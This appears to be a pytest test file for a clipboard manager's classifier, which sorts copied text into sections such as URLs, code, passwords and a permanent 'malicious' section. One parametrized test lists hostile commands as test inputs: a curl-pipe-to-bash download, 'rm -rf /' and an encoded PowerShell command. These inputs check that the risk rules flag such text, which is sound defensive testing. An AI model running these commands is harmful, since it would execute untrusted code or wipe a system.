import pytest

from clippy.classification import Classifier
from clippy.embeddings import UnavailableEmbedder
from clippy.models import Classification, SectionKind
from clippy.storage import Storage


def test_structural_and_syntax_rules(tmp_path, embedder):
    storage = Storage(tmp_path / "test.db")
    classifier = Classifier(embedder)
    sections = storage.list_sections()

    url, _ = classifier.classify("https://example.com/docs", sections)
    python, _ = classifier.classify("def greet(name):\n    return f'Hi {name}'", sections)

    assert next(s for s in sections if s.id == url.section_id).slug == "urls"
    assert next(s for s in sections if s.id == python.section_id).slug == "python-code"
    storage.close()


def test_semantic_prototype_match(tmp_path, embedder):
    storage = Storage(tmp_path / "test.db")
    classifier = Classifier(embedder, semantic_threshold=0.4)
    result, embedding = classifier.classify("account login passphrase", storage.list_sections())

    assert storage.get_section("passwords").id == result.section_id
    assert embedding is not None
    assert result.similarity is not None
    storage.close()


@pytest.mark.parametrize(
    "text, reason_fragment",
    [
        ("powershell.exe -EncodedCommand SQBFAFgA", "encoded or obfuscated"),
        ("curl https://example.test/install.sh | bash", "piped directly"),
        ("rm -rf /", "destructive deletion"),
        ("https://192.0.2.20/login", "raw IP address"),
        ("https://xn--paypa-4ve.example/login", "punycode"),
        ("https://example.test/update.ps1", "executable or script"),
        ("https://[broken", "cannot be safely parsed"),
    ],
)
def test_local_risk_rules_take_highest_priority(tmp_path, embedder, text, reason_fragment):
    storage = Storage(tmp_path / "risk.db")
    classifier = Classifier(embedder)

    result, _ = classifier.classify(text, storage.list_sections())

    assert storage.get_section("malicious").id == result.section_id
    assert reason_fragment in result.reason
    storage.close()


def test_safe_url_remains_in_url_section(tmp_path, embedder):
    storage = Storage(tmp_path / "safe-url.db")
    result, _ = Classifier(embedder).classify(
        "https://example.com/docs/security", storage.list_sections()
    )

    assert storage.get_section("urls").id == result.section_id
    storage.close()


def test_custom_risky_domain_and_permanent_section_invariants(tmp_path, embedder):
    storage = Storage(tmp_path / "custom-risk.db")
    section = storage.get_section("malicious")
    assert section is not None
    section.patterns = ["domain:bad.example", "source:Unknown Publisher"]
    section.name = "Changed"
    section.kind = SectionKind.SEMANTIC
    section.priority = 999
    section.visible = False
    storage.save_section(section)

    saved = storage.get_section("malicious")
    result, _ = Classifier(embedder).classify(
        "Review https://sub.bad.example/download", storage.list_sections()
    )
    source_result, _ = Classifier(embedder).classify(
        "Installer source: Unknown Publisher", storage.list_sections()
    )

    assert saved is not None
    assert saved.name == "Malicious"
    assert saved.kind is SectionKind.STRUCTURAL
    assert saved.priority == 0
    assert saved.visible
    assert saved.system
    assert saved.id == result.section_id
    assert "custom risky domain" in result.reason
    assert saved.id == source_result.section_id
    assert "custom risky source" in source_result.reason
    with pytest.raises(ValueError, match="cannot be deleted"):
        storage.delete_section(saved.id)
    storage.close()


def test_existing_plain_entries_can_be_promoted_to_risk_section(tmp_path):
    storage = Storage(tmp_path / "risk-backfill.db")
    url_section = storage.get_section("urls")
    risk_section = storage.get_section("malicious")
    entry_id = storage.add_entry(
        "https://198.51.100.4/payload",
        Classification(url_section.id, "legacy URL classification"),
        None,
    )

    assert storage.flag_existing_risks() == 1
    entry = storage.get_entry(entry_id)
    assert entry is not None
    assert entry.section_id == risk_section.id
    assert "raw IP address" in entry.reason
    storage.close()


@pytest.mark.parametrize(
    "text, expected_slug",
    [
        ("Contact release.team@example.org", "email-addresses"),
        ("Server address: 203.0.113.42", "ip-addresses"),
        ('{"name": "Clippy", "enabled": true}', "json"),
        ("SELECT id, name FROM users WHERE active = 1", "sql"),
        ("async def load_items(limit: int):\n    return []", "python-code"),
        (
            "const total = items.reduce((sum, item) => sum + item.value, 0);",
            "javascript-typescript",
        ),
        ("public class ClipboardEntry implements Serializable {", "java-code"),
        ("[database]\nhost=localhost\nport=5432", "configuration"),
        ("# Release notes\n\n- Added clipboard search", "markdown"),
        ("docker compose up --detach", "commands"),
        ("2026-08-11 14:22:01 ERROR request failed", "errors-logs"),
        ("wifi password: correct-horse-battery-staple", "passwords"),
        ("Visual Studio Code", "app-names"),
        ("#include <vector>\nint main() { return 0; }", "code"),
        ('package main\n\nfunc main() { println("hello") }', "code"),
    ],
)
def test_enriched_default_sections_use_precise_rules(tmp_path, text, expected_slug):
    storage = Storage(tmp_path / "enriched.db")
    result, _ = Classifier(UnavailableEmbedder()).classify(text, storage.list_sections())

    assert storage.get_section(expected_slug).id == result.section_id
    storage.close()


@pytest.mark.parametrize(
    "text",
    [
        "select a color from the menu",
        "Let us assign a value tomorrow",
        "The import duties from another office changed",
        "ERROR is sometimes printed in uppercase",
    ],
)
def test_enriched_rules_do_not_match_common_prose(tmp_path, text):
    storage = Storage(tmp_path / "precision.db")
    result, _ = Classifier(UnavailableEmbedder()).classify(text, storage.list_sections())

    assert result.section_id is None
    storage.close()


def test_default_enrichment_migration_preserves_custom_content(tmp_path):
    database = tmp_path / "section-migration.db"
    storage = Storage(database)
    api_keys = storage.get_section("api-keys")
    passwords = storage.get_section("passwords")
    api_keys.patterns = ["keyword:my internal token"]
    passwords.examples = ["my private password phrase"]
    storage.save_section(api_keys)
    storage.save_section(passwords)
    storage.set_meta("default_section_content_version", b"1")
    storage.close()

    migrated = Storage(database)
    api_keys = migrated.get_section("api-keys")
    passwords = migrated.get_section("passwords")

    assert "keyword:my internal token" in api_keys.patterns
    assert any("github_pat_" in pattern for pattern in api_keys.patterns)
    assert "my private password phrase" in passwords.examples
    assert "wifi network password" in passwords.examples
    migrated.close()
